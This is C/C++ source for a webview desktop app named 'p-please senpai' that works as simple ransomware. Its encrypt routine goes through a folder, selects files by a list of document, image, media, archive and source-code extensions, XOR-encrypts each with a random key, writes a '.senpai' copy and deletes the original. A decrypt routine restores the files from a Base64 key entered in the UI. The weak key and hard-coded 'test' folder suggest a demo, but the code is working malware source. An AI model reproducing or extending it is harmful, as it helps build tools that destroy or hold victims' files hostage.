#include "webview.h"
#include <stdio.h>
#include <stddef.h>

#include <ostream>
#include <iostream>

#include "html.c"

/* select_folder */
std::string select_folder() {
    std::string folderPath;

#ifdef _WIN32
    BROWSEINFO bi = {0};
    bi.ulFlags = BIF_USENEWUI | BIF_NEWDIALOGSTYLE;
    LPITEMIDLIST pidl = SHBrowseForFolder(&bi);
    if (pidl) {
        char path[MAX_PATH];
        if (SHGetPathFromIDList(pidl, path)) {
            folderPath = path;
        }
        CoTaskMemFree(pidl);
    }
#elif __APPLE__
    FILE *fp = popen("osascript -e 'set folderPath to POSIX path of (choose folder)' -e 'return folderPath'", "r");
    if (fp == NULL) {
        perror("Error executing AppleScript");
        return "";
    }

    char *line = nullptr;
    size_t len = 0;
    ssize_t read;

    if ((read = getline(&line, &len, fp)) != -1) {
        if (read > 0 && line[read - 1] == '\n') {
            line[read - 1] = '\0';
        }
        folderPath = line;
        free(line);
    }

    pclose(fp);
#elif __linux__
    FILE *fp = NULL;

    fp = popen("kdialog --getexistingdirectory", "r");
    if (fp != NULL) {
        char *line = NULL;
        size_t len = 0;
        ssize_t read;

        if ((read = getline(&line, &len, fp)) != -1) {
            if (read > 0 && line[read - 1] == '\n') {
                line[read - 1] = '\0';
            }
            folderPath = line;
            free(line);
        }

        pclose(fp);
    } else {
        fp = popen("zenity --file-selection --directory", "r");
        if (fp != NULL) {
            char *line = NULL;
            size_t len = 0;
            ssize_t read;

            if ((read = getline(&line, &len, fp)) != -1) {
                if (read > 0 && line[read - 1] == '\n') {
                    line[read - 1] = '\0';
                }
                folderPath = line;
                free(line);
            }

            pclose(fp);
        } else {
            fprintf(stderr, "Error: Neither kdialog nor zenity is installed. Please install one of them to use this feature.\n");
            return "";
        }
    }
#else
    fprintf(stderr, "Unsupported OS\n");
    return "";
#endif

    return folderPath;
}

/* */

/* xor_encrypt */

#include <stdlib.h>
#include <string.h>
#include <openssl/rand.h>
#include <openssl/evp.h>
#include <dirent.h>
#include <sys/stat.h>
#include <stdbool.h>

#ifdef _WIN32
#include <windows.h>
#include <io.h>
#include <fcntl.h>
#define PATH_SEPARATOR '\\'
#else
#include <unistd.h>
#define PATH_SEPARATOR '/'
#endif

#define KEY_LENGTH 4 // Adjust the length as needed
const char *directory = "test";

const char *extensions[] = {
    ".jpg", ".txt", ".png", ".pdf",
    ".hwp", ".psd", ".cs", ".c",
    ".cpp", ".vb", ".bas", ".frm",
    ".mp3", ".wav", ".flac", ".gif",
    ".doc", ".xls", ".xlsx", ".docx",
    ".ppt", ".pptx", ".js", ".avi",
    ".mp4", ".mkv", ".zip", ".rar",
    ".alz", ".egg", ".7z", ".jpeg"};
#define NUM_EXTENSIONS (sizeof(extensions) / sizeof(extensions[0]))

void handle_error(const char *message)
{
    perror(message);
    exit(EXIT_FAILURE);
}


bool has_allowed_extension(const char *filename)
{
    for (size_t i = 0; i < NUM_EXTENSIONS; i++)
    {
        if (strstr(filename, extensions[i]) != NULL)
        {
            return true;
        }
    }
    return false;
}

void xor_encrypt_decrypt(unsigned char *data, size_t data_len, unsigned char *key, size_t key_len)
{
    for (size_t i = 0; i < data_len; i++)
    {
        data[i] ^= key[i % key_len];
    }
}

unsigned char *generate_random_key(size_t length)
{
    unsigned char *key = (unsigned char *)malloc(length);
    if (key == NULL)
    {
        handle_error("Failed to allocate memory for key");
    }
    if (RAND_bytes(key, length) != 1)
    {
        handle_error("Failed to generate random key");
    }
    return key;
}

char *encode_key_base64(const unsigned char *key, size_t key_len)
{
    int encoded_len = 4 * ((key_len + 2) / 3);
    char *encoded_key = (char *)malloc(encoded_len + 1);
    if (encoded_key == NULL)
    {
        handle_error("Failed to allocate memory for Base64 encoded key");
    }
    EVP_EncodeBlock((unsigned char *)encoded_key, key, key_len);
    return encoded_key;
}

unsigned char *decode_key_base64(const char *encoded_key, size_t *out_len)
{
    int decoded_len = strlen(encoded_key);
    unsigned char *decoded_key = (unsigned char *)malloc(decoded_len);
    if (decoded_key == NULL)
    {
        handle_error("Failed to allocate memory for decoded key");
    }
    *out_len = EVP_DecodeBlock(decoded_key, (const unsigned char *)encoded_key, decoded_len);
    return decoded_key;
}

void encrypt_file(const char *file_path, unsigned char *key)
{
    FILE *file = fopen(file_path, "rb");
    if (!file)
    {
        handle_error("Failed to open file for encryption");
    }

    fseek(file, 0, SEEK_END);
    long file_size = ftell(file);
    fseek(file, 0, SEEK_SET);

    unsigned char *data = (unsigned char *)malloc(file_size);
    if (data == NULL)
    {
        handle_error("Failed to allocate memory for file data");
    }

    fread(data, 1, file_size, file);
    fclose(file);

    xor_encrypt_decrypt(data, file_size, key, KEY_LENGTH);

    char encrypted_file_path[1024];
    snprintf(encrypted_file_path, sizeof(encrypted_file_path), "%s.senpai", file_path);

    file = fopen(encrypted_file_path, "wb");
    if (!file)
    {
        handle_error("Failed to open file for writing encrypted data");
    }
    fwrite(data, 1, file_size, file);
    fclose(file);

    free(data);
    remove(file_path);
}

void decrypt_file(const char *file_path, unsigned char *key)
{
    FILE *file = fopen(file_path, "rb");
    if (!file)
    {
        handle_error("Failed to open file for decryption");
    }

    fseek(file, 0, SEEK_END);
    long file_size = ftell(file);
    fseek(file, 0, SEEK_SET);

    unsigned char *data = (unsigned char *)malloc(file_size);
    if (data == NULL)
    {
        handle_error("Failed to allocate memory for file data");
    }

    fread(data, 1, file_size, file);
    fclose(file);

    xor_encrypt_decrypt(data, file_size, key, KEY_LENGTH);

    char decrypted_file_path[1024];
    snprintf(decrypted_file_path, sizeof(decrypted_file_path), "%s", file_path);
    decrypted_file_path[strlen(decrypted_file_path) - 7] = '\0';

    file = fopen(decrypted_file_path, "wb");
    if (!file)
    {
        handle_error("Failed to open file for writing decrypted data");
    }
    fwrite(data, 1, file_size, file);
    fclose(file);

    free(data);
    remove(file_path);
}

#ifdef _WIN32
void encrypt_directory(const char *directory, unsigned char *key)
{
    WIN32_FIND_DATA find_file_data;
    HANDLE hFind = FindFirstFile(strcat(strdup(directory), "\\*"), &find_file_data);

    if (hFind == INVALID_HANDLE_VALUE)
    {
        handle_error("Failed to open directory");
    }

    do
    {
        if (!(find_file_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
        {
            char file_path[1024];
            snprintf(file_path, sizeof(file_path), "%s\\%s", directory, find_file_data.cFileName);

            if (has_allowed_extension(find_file_data.cFileName))
            {
                encrypt_file(file_path, key);
            }
        }
    } while (FindNextFile(hFind, &find_file_data) != 0);

    FindClose(hFind);
}
#else
void encrypt_directory(const char *directory, unsigned char *key)
{
    struct dirent *entry;
    DIR *dp = opendir(directory);

    if (dp == NULL)
    {
        handle_error("Failed to open directory");
    }

    while ((entry = readdir(dp)))
    {
        if (entry->d_type == DT_REG)
        {
            char file_path[1024];
            snprintf(file_path, sizeof(file_path), "%s/%s", directory, entry->d_name);

            if (has_allowed_extension(entry->d_name))
            {
                encrypt_file(file_path, key);
            }
        }
    }

    closedir(dp);
}
#endif

#ifdef _WIN32
void decrypt_directory(const char *directory, unsigned char *key)
{
    WIN32_FIND_DATA find_file_data;
    HANDLE hFind = FindFirstFile(strcat(strdup(directory), "\\*.senpai"), &find_file_data);

    if (hFind == INVALID_HANDLE_VALUE)
    {
        handle_error("Failed to open directory");
    }

    do
    {
        if (!(find_file_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
        {
            char file_path[1024];
            snprintf(file_path, sizeof(file_path), "%s\\%s", directory, find_file_data.cFileName);
            decrypt_file(file_path, key);
        }
    } while (FindNextFile(hFind, &find_file_data) != 0);

    FindClose(hFind);
}
#else
void decrypt_directory(const char *directory, unsigned char *key)
{
    struct dirent *entry;
    DIR *dp = opendir(directory);

    if (dp == NULL)
    {
        handle_error("Failed to open directory");
    }

    while ((entry = readdir(dp)))
    {
        if (entry->d_type == DT_REG && strstr(entry->d_name, ".senpai"))
        {
            char file_path[1024];
            snprintf(file_path, sizeof(file_path), "%s/%s", directory, entry->d_name);
            decrypt_file(file_path, key);
        }
    }

    closedir(dp);
}
#endif

char *remove_first_last_two(const char *str)
{
    size_t length = strlen(str);
    
    if (length <= 4)
    {
        // If the length is 4 or less, we can't remove 2 characters from each end
        return NULL;
    }
    
    // Allocate memory for the new string
    char *new_str = (char *)malloc(length - 4 + 1);
    if (new_str == NULL)
    {
        perror("Memory allocation failed");
        exit(EXIT_FAILURE);
    }
    
    // Copy the string, excluding the first two and last two characters
    strncpy(new_str, str + 2, length - 4);
    new_str[length - 4] = '\0';  // Null-terminate the new string
    
    return new_str;
}

void call_encrypt(const char *id, const char *req, void *arg)
{
    (void)id;
    (void)req;
    (void)arg;
    printf("Encrypting.\n");
    unsigned char *key = generate_random_key(KEY_LENGTH);
    char *encoded_key = encode_key_base64(key, KEY_LENGTH);
    printf("Base64 Encoded Key: %s\n", encoded_key);
    encrypt_directory(directory, key);

    free(key);
    free(encoded_key);
}

void call_decrypt(const char *id, const char *req, void *arg)
{
    (void)id;
    (void)arg;

    // Make a copy of the request string
    char *req_copy = strdup(req);
    if (req_copy == NULL)
    {
        handle_error("Failed to duplicate request string");
    }

    // Clean the request string by removing the first two and last two characters
    char *cleaned_req = remove_first_last_two(req_copy);
    if (cleaned_req == NULL)
    {
        handle_error("Failed to clean request string");
    }

    printf("Decrypting using %s.\n", cleaned_req);

    // Decode the key from Base64
    size_t key_len;
    unsigned char *key = decode_key_base64(cleaned_req, &key_len);

    // Perform decryption on the directory
    decrypt_directory(directory, key);

    // Free allocated memory
    free(req_copy);
    free(cleaned_req);
    free(key);
}

/* */


#ifdef _WIN32
#include <windows.h>
#endif

void call_encrypt(const char *id, const char *req, void *arg);
void call_decrypt(const char *id, const char *req, void *arg);

#ifdef _WIN32
int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrevInst, LPSTR lpCmdLine,
                   int nCmdShow)
{
    (void)hInst;
    (void)hPrevInst;
    (void)lpCmdLine;
    (void)nCmdShow;
#else
int main()
{
#endif
    try {
        webview::webview w(true, nullptr);
        w.set_title("p-please senpai - phoenixthrush");
        w.set_size(950, 650, WEBVIEW_HINT_FIXED);

        w.bind(
            "call_encrypt",
            [&](const std::string &id, const std::string &req, void * /*arg*/)
            {
                std::thread([&, id, req]
                            {
                                call_encrypt(id.c_str(), req.c_str(), nullptr);
                                w.resolve(id, 0, "true"); })
                    .detach();
            },
            nullptr);

        w.bind(
            "call_decrypt",
            [&](const std::string &id, const std::string &req, void * /*arg*/)
            {
                std::thread([&, id, req]
                            {
                                call_decrypt(id.c_str(), req.c_str(), nullptr);
                                w.resolve(id, 0, "true"); })
                    .detach();
            },
            nullptr);

        w.set_html((const char *)site_index_html);
        w.run();
    }
    catch (const webview::exception &e) {
        std::cerr << e.what() << std::endl;
        return 1;
    }
}

